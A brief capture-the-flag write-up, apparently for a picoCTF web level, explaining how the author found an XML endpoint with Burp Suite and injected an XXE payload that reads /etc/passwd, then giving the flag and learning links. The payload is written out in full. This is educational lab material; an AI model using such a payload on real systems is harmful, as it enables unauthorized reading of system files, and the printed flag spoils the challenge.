In this lvl we need to perform XXE attack.
First I intetercepted the request using burpsuite.
Then I clicked on details.
I came to know that the site is using xml therfore we can use xxe here.
I injected the following code :

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>
<ID>&xxe;</ID>
</data>

This allows us to read the /etc/passwd file.
There I got the flag.

--------------------------------------------
Flag : picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}
--------------------------------------------

Reading material : https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

Port swigger is very useful to understand the working of the xxe exploitation.

Youtube video for better understanding : https://youtu.be/gjm6VHZa_8s?si=BiFgMTl7ps_oAqXP
